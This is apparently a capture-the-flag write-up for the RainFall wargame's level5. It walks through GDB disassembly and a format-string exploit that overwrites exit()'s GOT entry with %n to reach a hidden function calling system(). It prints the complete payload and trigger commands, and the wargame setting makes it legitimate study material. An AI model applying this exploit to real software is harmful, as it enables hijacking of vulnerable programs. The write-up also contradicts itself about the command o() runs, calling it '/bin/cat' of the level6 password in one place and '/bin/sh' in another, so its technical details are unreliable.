# Level5 - ASM Analysis (GDB only)

## Prerequisites for Exploitation

Before performing any kind of exploitation, we assess the security mitigations in place for this binary.

### 1. Address Space Layout Randomization (ASLR)

Check if ASLR is enabled:

```bash
level5@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
```

A value of `0` means ASLR is **disabled**, memory addresses will remain consistent across executions, which simplifies our analysis.

### 2. Stack Protections

Check protections with `checksec`:

```bash
level5@RainFall:~$ checksec --file ./level5
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level5
```

**Interpretation:**

* No RELRO: no protection for GOT.
* No Canary: we can overwrite the stack freely.
* NX disabled: stack is executable, though unused here.
* No PIE: binary loads at a fixed address.

**Conclusion:**

The binary includes **no modern protections**. It is a perfect candidate for classic exploitation techniques. Just like in level4, our approach will revolve around a **format string vulnerability**, but this time used to overwrite a GOT entry, allowing us to hijack program control flow by redirecting execution to a hidden function.

---

## Disassembly Analysis

This section provides a detailed analysis of the assembly code for the three functions in the level5 binary, using GDB. Each instruction is interpreted to understand control flow, memory interactions, and the underlying vulnerability.

### Disassembly of `main()`

Before analyzing the main function, we inspect the full list of functions defined in the binary to identify hidden logic that isn't invoked explicitly:

```bash
(gdb) info functions
0x080484a4  o
0x080484c2  n
0x08048504  main
```

This reveals a non-called function named `o()` which invokes `system()` with the flag-retrieval command. We will later aim to redirect execution flow to this function.

#### Function Prologue and Call

```asm
0x08048504 <+0>:     push   %ebp  
0x08048505 <+1>:     mov    %esp,%ebp  
0x08048507 <+3>:     and    $0xfffffff0,%esp  
0x0804850a <+6>:     call   0x80484c2 <n>  
0x0804850f <+11>:    leave  
0x08048510 <+12>:    ret  
```

<+0>: Save the caller's base pointer.  
<+1>: Set up a new stack frame.  
<+3>: Align the stack to a 16-byte boundary (compiler convention).  
<+6>: Call the function `n()`.  
<+11>: Restore the previous base pointer and stack pointer.  
<+12>: Return to the caller.  

The `main` function is a thin wrapper. It delegates all logic to `n()`.

---

### Disassembly of `n()`

#### Function Prologue

```asm
0x080484c2 <+0>:     push   %ebp  
0x080484c3 <+1>:     mov    %esp,%ebp  
0x080484c5 <+3>:     sub    $0x218,%esp  
```

<+0>: Save the base pointer of the caller.  
<+1>: Create a new stack frame.  
<+3>: Reserve 536 bytes of local stack space (includes a 520-byte buffer).  

#### Safe Input Read via `fgets`

```asm
0x080484cb <+9>:     mov    0x8049848,%eax  
0x080484d0 <+14>:    mov    %eax,0x8(%esp)  
0x080484d4 <+18>:    movl   $0x200,0x4(%esp)  
0x080484dc <+26>:    lea    -0x208(%ebp),%eax  
0x080484e2 <+32>:    mov    %eax,(%esp)  
0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>  
```

<+9>: Load the address of `stdin` into `eax`.  
<+14>: Set `stdin` as the third argument to `fgets()`.  
<+18>: Set the second argument to 512 (0x200).  
<+26>: Load the address of the local buffer into `eax`.  
<+32>: Pass the buffer as the first argument.  
<+35>: Call `fgets(buffer, 512, stdin)`.  

#### Format String Vulnerability

```asm
0x080484ea <+40>:    lea    -0x208(%ebp),%eax  
0x080484f0 <+46>:    mov    %eax,(%esp)  
0x080484f3 <+49>:    call   0x8048380 <printf@plt>  
```

<+40>: Load the address of the buffer into `eax`.  
<+46>: Pass it as the sole argument.  
<+49>: Call `printf(buffer)`, vulnerable to format string injection.  

#### Exit Call

```asm
0x080484f8 <+54>:    movl   $0x1,(%esp)  
0x080484ff <+61>:    call   0x80483d0 <exit@plt>  
```

<+54>: Push the exit code `1` onto the stack.  
<+61>: Call the `exit()` function.  

The `n()` function reads user input safely using `fgets()`, but then passes it directly to `printf()` without a format string. This opens a format string vulnerability. The function then calls `exit()`, which we will hijack by modifying its GOT entry.

---

### Disassembly of `o()`

#### Function Prologue

```asm
0x080484a4 <+0>:     push   %ebp  
0x080484a5 <+1>:     mov    %esp,%ebp  
0x080484a7 <+3>:     sub    $0x18,%esp  
```

<+0>: Save caller’s base pointer.  
<+1>: Set up a new stack frame.  
<+3>: Reserve 24 bytes of stack space.  

#### Call to `system()`

```asm
0x080484aa <+6>:     movl   $0x80485f0,(%esp)  
0x080484b1 <+13>:    call   0x80483b0 <system@plt>  
```

<+6>: Push the address of the string "/bin/cat /home/user/level6/.pass" onto the stack.  
<+13>: Call `system()` to execute the command.  

#### Call to `_exit()`

```asm
0x080484b6 <+18>:    movl   $0x1,(%esp)  
0x080484bd <+25>:    call   0x8048390 <_exit@plt>  
```

<+18>: Push the exit code `1` onto the stack.  
<+25>: Call `_exit(1)` to terminate the program immediately.  

The `o()` function is never called during normal execution. It exists as a hidden function that executes a command to print the level6 flag. We will redirect execution to this function by overwriting the GOT entry for `exit()`.

---

## GDB Runtime Analysis

This section documents the dynamic analysis of the level5 binary using GDB. The goal is to understand the binary's runtime behavior, inspect memory and register states, and perform the exploit **entirely via GDB**.

---

### Step 1: Confirm GOT Address of `exit()` and Target `o()`

First, verify the GOT address of `exit()` and the address of the hidden `o()` function:

```bash
(gdb) info address exit
Symbol "exit" is at 0x80483d0 in a file compiled without debugging.
```

We want to overwrite the **GOT entry** for `exit()`, not the PLT stub. Use:

```bash
(gdb) info functions
```

This reveals the address of `o()`:

```bash
0x080484a4  o
```

And we locate the GOT entry for `exit()`:

```bash
(gdb) x/wx 0x08049838
0x8049838 <exit@got.plt>:       0x080483d6
```

We will aim to write `0x080484a4` into this location.

---

### Step 2: Set Breakpoint Before `printf()`

Set a breakpoint at the `printf()` call to examine the stack:

```bash
(gdb) break *0x080484f3
(gdb) run
```

Input:

```
AAAA
```

---

### Step 3: Inspect Stack and Buffer

Check the base pointer and stack memory:

```bash
(gdb) info registers
eax            0xbffff520       -1073744608
esp            0xbffff510       0xbffff510
ebp            0xbffff728       0xbffff728
(gdb) x/40x $esp
0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
```

Look for the value `0x41414141` (our "AAAA") in memory. Then verify the buffer address:

```bash
(gdb) print $ebp - 0x208
$1 = 0xbffff520
```

The buffer location should align with what we see on the stack:

```bash
(gdb) x/4x 0xbffff520
0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
```

This confirms that our input buffer is located at `$ebp - 0x208`, and that user input is passed to `printf()` directly from there.

---

### Step 4: Inject GOT Address into Buffer and Determine Offset

We want to inject the GOT address of `exit()` into the input and identify where it lands on the stack.

```bash
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + " %x" * 10' | ./level5
8 200 b7fd1ac0 b7ff37d0 8049838 20782520 25207825 78252078 20782520 25207825 78252078
```

Look for the sequence `08049838` in the output. It usually appears at the 4th stack argument, so we will use `%4$n`.

---

### Step 5: Perform the Overwrite with `%n`

We will use `%n` to write the value `0x080484a4` (decimal: `134513828`) to the GOT entry of `exit()`.

To avoid counting the 4 bytes of the address, we subtract from the total:

```bash
python -c 'print("\x38\x98\x04\x08" + "%134513824d" + "%4$n")' > /tmp/exploit
```

---

### Step 6: Verify Overwrite and Trigger

Place a breakpoint at `exit()` and `o()`:

```bash
(gdb) break *0x080484a4   # entry of o()
(gdb) run < /tmp/exploit
```

Check that the GOT has been overwritten:

```bash
(gdb) x/wx 0x08049838
0x8049838 <exit@got.plt>:       0x080484a4
```

Now `exit()` will jump into `o()` and reveal the flag.

---

### Step 7: Confirm Shell Execution

The function `o()` executes the following instruction:

```asm
0x080484aa <+6>:    movl   $0x80485f0,(%esp)
```

This means the string passed to `system()` is located at address `0x080485f0`. We can confirm it in GDB:

```bash
(gdb) x/s 0x080485f0
0x80485f0:  "/bin/sh"
```

Unlike in level4, the binary here does not run a `cat` command. Instead, it invokes a non-interactive shell. Since the exploit is run with redirected input or within GDB, `/bin/sh` immediately exits and does not display anything.

To observe the shell behavior outside of GDB, use:

```bash
cat /tmp/exploit - | ./level5
```

This ensures that `/bin/sh` receives proper input and remains open for interaction, confirming that the control flow redirection was successful.

---

### Conclusion

This level demonstrates how a format string vulnerability can be used to overwrite function pointers in the GOT. By carefully placing the target address in memory and using `%n`, we redirected execution from `exit()` to the hidden function `o()`, which contains a call to `system()`.

Key insights:

* Address of `exit()` GOT: `0x08049838`
* Target function `o()`: `0x080484a4`
* Input buffer location: `$ebp - 0x208`
* Format string argument offset: `%4$n`

GDB enabled precise control over the exploitation process:

* Stack and buffer verification via `x/40x $esp`
* Address calculation using register inspection
* GOT overwrite validation before executing the payload

This hands-on approach reinforces how powerful and surgical format string exploits can be when paired with runtime analysis.
